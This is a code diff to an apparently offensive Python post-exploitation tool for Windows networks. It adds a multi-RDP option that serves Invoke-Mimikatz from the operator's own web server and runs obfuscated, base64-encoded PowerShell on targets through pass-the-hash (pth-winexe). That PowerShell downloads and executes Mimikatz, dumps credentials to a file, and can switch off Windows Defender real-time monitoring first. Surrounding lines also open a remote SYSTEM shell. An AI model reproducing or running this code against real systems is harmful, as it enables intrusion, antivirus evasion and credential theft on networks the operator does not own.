@@ -578,6 +578,85 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			if multi_rdp in yesanswers:
+				try:
+					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
+					if not os.path.isfile('./a'):
+						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
+						exit(1)
+					print colored("[+]Looks good",'green')	
+					
+					#Check to make sure port is not already in use
+					for i in xrange(10):
+						PORT = randint(49151,65535)					
+						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if len(stdout_value)>0:
+							break
+
+
+					my_ip=get_ip_address('eth0')
+					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
+					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+					httpd = SocketServer.TCPServer(("",PORT), Handler)
+					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
+					server_process = multiprocessing.Process(target=httpd.serve_forever)
+					server_process.daemon = True
+					server_process.start()	
+					
+					x=' '
+					
+					if "Windows 10.0" in os_version:
+						#Get Windows Defender status and store status
+						print colored("[+]Getting Windows Defender Status",'yellow')
+						line="Get-MpPreference | fl DisableRealtimeMonitoring"
+						en = b64encode(line.encode('UTF-16LE'))						
+						
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if "DisableRealtimeMonitoring : False" in stdout_value:
+							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
+							AVstatus='On'
+						else:
+							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
+							AVstatus='Off'
+
+					if "Windows 10.0" in os_version:
+						
+												
+						#If Windows Defender is turned on turn off 
+						if AVstatus=='On':
+							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
+							if response in yesanswers:	
+								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
+								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
+								en = b64encode(line.encode('UTF-16LE'))						
+								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						
+						#Prepare string
+						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
+					else:
+						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Command \"ts::multirdp\""
+					
+					print colored("[+] Using: "+line,'yellow')
+					en = b64encode(line.encode('UTF-16LE'))
+					print colored("[+] Encoding command: "+en,'yellow')
+					
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+										
+					if "Windows 10.0" in os_version:
+						#If Windows Defender AV status was on, turn it back on
+						if AVstatus=='On':
+							if response in yesanswers:	
+								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
+								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
+								en = b64encode(line.encode('UTF-16LE'))						
+								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+
+					
+				except OSError:
+					print colored("[-]Something went wrong here...",'red')
+
 			if mimikittenz in yesanswers:
 				try:
 					print colored("[+]Checking for Invoke-mimikittenz.ps1",'green')
@@ -994,6 +1073,7 @@ p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Opti
 p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
 p.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
+p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
 # Hash related
 p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
 p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
@@ -1063,6 +1143,7 @@ golden_ticket=args.golden_ticket
 edq_autologon=args.edq_autologon
 edq_allowtgtsessionkey=args.edq_allowtgtsessionkey
 system_tasklist=args.system_tasklist
+multi_rdp=args.multi_rdp
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1705,6 +1786,7 @@ if dropshell in yesanswers:
 			print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
 			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 			sys.exit()
+				
 		except:
 			sys.exit()
 	else:
